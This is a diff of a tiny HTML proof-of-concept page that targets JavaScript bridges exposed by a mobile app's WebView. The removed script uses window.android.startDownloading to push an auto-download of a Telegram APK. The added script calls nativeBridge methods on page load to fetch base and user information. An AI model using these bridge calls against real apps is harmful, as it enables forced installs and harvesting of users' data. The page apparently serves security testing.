@@ -1,19 +1,8 @@
-<!DOCTYPE html>
 <html>
-<body>
-<script>
-function triggerDownload() {
-    window.android.startDownloading(
-        's_c3fe8d23f079447aac8603a4d270d7b2', // itemID
-        'Telegram', // name
-        'AppDetail', // detailType
-        'org.telegram.messenger', // packageName
-        'apk', // format
-        '1' // iad (auto-download)
-    );
-    alert('Download triggered!');
-}
-</script>
-<button onclick="triggerDownload()">Trigger APK Download</button>
-</body>
+    <body>
+        <script>
+            window.nativeBridge.callNative('getBaseInfo','cb','{}');
+            window.nativeBridge.callNative('getUserInfo','cb','{}');
+        </script>
+    </body>
 </html>
